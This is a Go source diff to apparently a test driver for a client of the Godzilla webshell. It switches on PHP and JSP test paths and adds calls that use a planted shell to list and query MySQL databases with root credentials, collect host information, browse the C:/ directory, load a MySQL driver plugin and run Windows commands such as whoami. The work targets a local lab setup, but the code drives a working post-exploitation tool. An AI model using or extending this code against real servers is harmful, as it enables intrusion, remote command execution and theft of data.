@@ -25,8 +25,8 @@ const (
 
 func main() {
 	log.SetFlags(log.Lshortfile)
-	log.Println("Jsp")
-	testJspBs64()
+	//log.Println("Jsp")
+	//testJspBs64()
 	//testJspRaw()
 	//
 	//log.Println("Jspx")
@@ -41,8 +41,8 @@ func main() {
 	//testAspBs64()
 	//testAspRaw()
 	//
-	//log.Println("Php")
-	//testPhpBs64()
+	log.Println("Php")
+	testPhpBs64()
 	//testPhpRaw()
 }
 
@@ -75,6 +75,31 @@ func testPhpBs64() {
 		log.Println(err)
 	}
 	fmt.Println(isAlive)
+
+	db := &godzilla.DBManagerParams{
+		DBType:     "mysql",
+		DBHost:     "127.0.0.1",
+		DBPort:     3306,
+		DBUsername: "root",
+		DBPassword: "root",
+		ExecType:   "select",
+		ExecSql:    "SHOW DATABASES",
+		DBCharset:  charset.UTF8CharSet,
+		CurrentDB:  "",
+	}
+	dbInfo, err := g.DatabaseManagement(db)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println("DatabaseManagement : \n", dbInfo.ToMap())
+
+	db.ExecSql = "SELECT * FROM `godzilla`.`test` LIMIT 0,10"
+
+	dbInfo, err = g.DatabaseManagement(db)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println("DatabaseManagement : \n", dbInfo.ToMap())
 }
 
 func testPhpRaw() {
@@ -131,6 +156,23 @@ func testAspxBs64() {
 		log.Println(err)
 	}
 	fmt.Println(isAlive)
+
+	db := &godzilla.DBManagerParams{
+		DBType:     "mysql",
+		DBHost:     "127.0.0.1",
+		DBPort:     3306,
+		DBUsername: "root",
+		DBPassword: "root",
+		ExecType:   "select",
+		ExecSql:    "SHOW DATABASES",
+		DBCharset:  charset.UTF8CharSet,
+		CurrentDB:  "",
+	}
+	dbInfo, err := g.DatabaseManagement(db)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println("DatabaseManagement : \n", dbInfo.ToMap())
 }
 
 func testAspxRaw() {
@@ -299,11 +341,12 @@ func testJspBs64() {
 		log.Println(err)
 	}
 	fmt.Println(isAlive)
-	//basic, err := g.BasicInfo()
-	//if err != nil {
-	//	log.Println(err)
-	//}
-	//fmt.Printf("%#+v\n", basic.ToMap())
+
+	basic, err := g.BasicInfo()
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Printf("%#+v\n", basic.ToMap())
 
 	cp := &godzilla.ExecParams{
 		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
@@ -316,12 +359,13 @@ func testJspBs64() {
 		log.Println(err)
 	}
 	fmt.Printf("Echo : %#+v\n", echo.ToString())
-	//gf := &godzilla.GetFiles{DirName: "C:/"}
-	//getFile, err := g.FileManagement(gf)
-	//if err != nil {
-	//	log.Println(err)
-	//}
-	//fmt.Println("getFiles : \n", getFile.ToMap())
+
+	gf := &godzilla.GetFiles{DirName: "C:/"}
+	getFile, err := g.FileManagement(gf)
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Println("getFiles : \n", getFile.ToMap())
 
 	//sfa := &godzilla.FixFileAttr{
 	//	FileName: "C:/shells/godzilla.txt",
@@ -334,9 +378,9 @@ func testJspBs64() {
 	//if err != nil {
 	//	log.Printf("%#+v\n", err)
 	//}
-	//
 	//fmt.Println("setFileAttr : \n", setFileAttr.ToMap())
-	//c, _ := payloads.GodJarPluginsFiles.ReadFile("godzilla/java/plugins/mysql.jar")
+
+	// 先加载数据库驱动
 	usePlugins, err := g.UsePlugins(plugins.NewJarDriverLoader(plugins.MysqlDriver))
 	if err != nil {
 		log.Println(err)
@@ -355,7 +399,7 @@ func testJspBs64() {
 		CurrentDB:  "",
 	}
 	dbInfo, err := g.DatabaseManagement(db)
-	fmt.Println("DatabaseManagement : \n", dbInfo.ToString())
+	fmt.Println("DatabaseManagement : \n", dbInfo.ToMap())
 
 	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&print 1"`)
 	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&whoami /"`)
